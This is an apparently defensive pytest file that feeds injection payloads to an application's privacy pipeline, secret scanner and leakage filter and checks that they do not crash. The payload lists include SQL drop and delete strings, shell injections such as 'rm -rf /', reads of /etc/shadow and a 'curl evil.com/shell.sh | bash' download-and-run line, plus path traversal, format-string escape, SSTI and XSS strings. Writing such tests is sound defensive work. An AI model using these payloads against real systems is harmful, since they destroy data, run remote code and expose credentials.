"""K1: Input Injection tests.

Attempts SQL injection, command injection, path traversal, format string
injection, and markdown injection against production pipelines.
"""

from __future__ import annotations

import pytest

from application.skill_compression.hypothesis_storage import (
    Hypothesis,
    HypothesisScope,
)
from application.skill_compression.privacy.privacy_pipeline import PrivacyPipeline
from application.skill_compression.privacy.secret_scanner import SecretScanner
from application.leakage_filter import (
    check_for_forbidden_patterns,
    check_for_system_prompt_leakage,
)


def _make_hypothesis(claim: str, scope_ctx: tuple[str, ...] = ()) -> Hypothesis:
    """Helper: create a Hypothesis with the given claim."""
    return Hypothesis(
        hypothesis_id="test-inj-001",
        user_id=1,
        claim=claim,
        scope=HypothesisScope(context=scope_ctx),
        created_at="2026-01-01T00:00:00Z",
        last_seen="2026-01-01T00:00:00Z",
    )


@pytest.mark.adversarial
class TestSQLInjection:
    """SQL injection payloads through hypothesis claims and scanner."""

    def test_sql_injection_in_claim_does_not_crash_pipeline(self) -> None:
        """WHAT: SQL injection payload in hypothesis claim.
        EXPECTED: Pipeline processes without crash, may block or pass.
        WHY: Claims come from LLM output which could contain SQL fragments.
        """
        pipeline = PrivacyPipeline()
        payloads = [
            "'; DROP TABLE hypotheses; --",
            "1 OR 1=1",
            "UNION SELECT * FROM hypotheses WHERE 1=1",
            "Robert'); DROP TABLE students;--",
        ]
        for payload in payloads:
            h = _make_hypothesis(payload)
            # Must not raise
            result = pipeline.check(h)
            # Result is either None (clean) or PipelineRejection
            assert result is None or result.source is not None

    def test_sql_injection_in_secret_scanner(self) -> None:
        """WHAT: SQL injection through SecretScanner.scan().
        EXPECTED: No crash, returns list of matches or empty.
        WHY: Scanner uses regex on arbitrary text, must handle SQL chars.
        """
        scanner = SecretScanner()
        payload = "'; DELETE FROM memory_entries WHERE '1'='1"
        matches = scanner.scan(payload)
        assert isinstance(matches, list)


@pytest.mark.adversarial
class TestCommandInjection:
    """Shell command injection via backticks, $(), semicolons."""

    def test_backtick_command_injection_in_claim(self) -> None:
        """WHAT: Backtick command injection in hypothesis claim.
        EXPECTED: No crash, treated as plain text.
        WHY: Claims should never be executed as shell commands.
        """
        pipeline = PrivacyPipeline()
        payloads = [
            "`rm -rf /`",
            "$(cat /etc/passwd)",
            "; ls -la; echo pwned",
            "| cat /etc/shadow",
            "&& curl evil.com/shell.sh | bash",
        ]
        for payload in payloads:
            h = _make_hypothesis(payload)
            result = pipeline.check(h)
            assert result is None or result.source is not None

    def test_command_injection_in_leakage_filter(self) -> None:
        """WHAT: Command injection payload through leakage filter.
        EXPECTED: No crash, returns None or refusal text.
        WHY: Leakage filter processes arbitrary LLM output.
        """
        payloads = [
            "$(rm -rf /home)",
            "`whoami`",
            "system('cat /etc/passwd')",
        ]
        for payload in payloads:
            result = check_for_forbidden_patterns(payload)
            assert result is None or isinstance(result, str)


@pytest.mark.adversarial
class TestPathTraversal:
    """Path traversal attempts (../../etc/passwd style)."""

    def test_path_traversal_in_claim(self) -> None:
        """WHAT: Path traversal payload in hypothesis claim.
        EXPECTED: SecretScanner may flag user_file_path, no crash.
        WHY: Claims from conversation import could contain file paths.
        """
        scanner = SecretScanner()
        payloads = [
            "../../etc/passwd",
            "..\\..\\Windows\\System32\\config\\SAM",
            "/home/user/.ssh/id_rsa",
            "C:\\Users\\admin\\Documents\\secrets.txt",
        ]
        for payload in payloads:
            matches = scanner.scan(payload)
            assert isinstance(matches, list)
            # At least the user-path patterns should catch some of these
            if "Users" in payload or "/home/" in payload:
                assert len(matches) > 0, f"Expected detection for: {payload}"


@pytest.mark.adversarial
class TestFormatStringInjection:
    """Format string injection (%s, {0}, {0.__class__})."""

    def test_python_format_string_in_claim(self) -> None:
        """WHAT: Python format string exploitation in claim.
        EXPECTED: No crash, treated as literal text.
        WHY: If claims are ever f-string-interpolated, this is dangerous.
        """
        pipeline = PrivacyPipeline()
        payloads = [
            "{0.__class__.__mro__[2].__subclasses__()}",
            "%s%s%s%s%s%s%s%s%s%s",
            "{0.__init__.__globals__}",
            "%(password)s",
            "${7*7}",  # SSTI
        ]
        for payload in payloads:
            h = _make_hypothesis(payload)
            result = pipeline.check(h)
            assert result is None or result.source is not None

    def test_format_string_in_leakage_check(self) -> None:
        """WHAT: Format string in leakage filter response check.
        EXPECTED: No crash, no format string evaluation.
        WHY: Leakage filter does string comparison, must not evaluate.
        """
        system_prompt = "You are a helpful assistant. Be kind."
        response = "{0.__class__.__bases__[0].__subclasses__()}"
        result = check_for_system_prompt_leakage(response, system_prompt)
        assert result is None or isinstance(result, str)


@pytest.mark.adversarial
class TestMarkdownInjection:
    """Malformed markdown and javascript: URLs."""

    def test_javascript_url_in_claim(self) -> None:
        """WHAT: javascript: URL in hypothesis claim.
        EXPECTED: No XSS execution (we are server-side), no crash.
        WHY: Claims may be rendered in Telegram (HTML mode).
        """
        pipeline = PrivacyPipeline()
        payloads = [
            "[click](javascript:alert(1))",
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        for payload in payloads:
            h = _make_hypothesis(payload)
            result = pipeline.check(h)
            assert result is None or result.source is not None

    def test_nested_markdown_in_leakage_filter(self) -> None:
        """WHAT: Deeply nested or malformed markdown.
        EXPECTED: No crash, no infinite loop.
        WHY: LLM output can contain arbitrarily nested markdown.
        """
        response = "```" * 50 + "\n" + "```" * 50
        result = check_for_forbidden_patterns(response)
        assert result is None or isinstance(result, str)

    def test_empty_code_blocks_in_leakage_filter(self) -> None:
        """WHAT: Many empty code blocks.
        EXPECTED: No crash.
        WHY: Edge case in markdown parsing.
        """
        response = "```\n```\n" * 100
        system_prompt = "You are helpful."
        result = check_for_system_prompt_leakage(response, system_prompt)
        assert result is None or isinstance(result, str)

    def test_html_entity_injection_in_claim(self) -> None:
        """WHAT: HTML entity injection in hypothesis claim.
        EXPECTED: No crash, treated as plain text by filters.
        WHY: Claims are rendered in Telegram HTML mode.
        """
        pipeline = PrivacyPipeline()
        claim = "User prefers &lt;b&gt;bold&lt;/b&gt; text &#x3C;script&#x3E;"
        h = _make_hypothesis(claim)
        result = pipeline.check(h)
        assert result is None or result.source is not None

    def test_null_byte_injection(self) -> None:
        """WHAT: Null byte in hypothesis claim.
        EXPECTED: No crash, processed as string with null char.
        WHY: Null bytes can terminate strings in C-based libraries.
        """
        pipeline = PrivacyPipeline()
        claim = "User prefers short\x00 answers"
        h = _make_hypothesis(claim)
        result = pipeline.check(h)
        assert result is None or result.source is not None
